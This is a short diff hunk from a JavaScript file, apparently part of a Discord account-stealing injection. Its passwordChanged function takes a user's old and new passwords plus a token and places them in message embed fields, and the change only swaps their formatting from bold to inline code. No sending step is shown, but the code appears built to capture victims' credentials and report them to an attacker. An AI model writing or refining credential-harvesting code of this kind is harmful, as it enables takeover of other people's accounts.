@@ -731,12 +731,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           fields: [
             {
               name: 'Old Password',
-              value: `**${oldpassword}**`,
+              value: `\`${oldpassword}\``,
               inline: false,
             },
             {
               name: 'New Password',
-              value: `**${newpassword}**`,
+              value: `\`${newpassword}\``,
               inline: false,
             },
             {
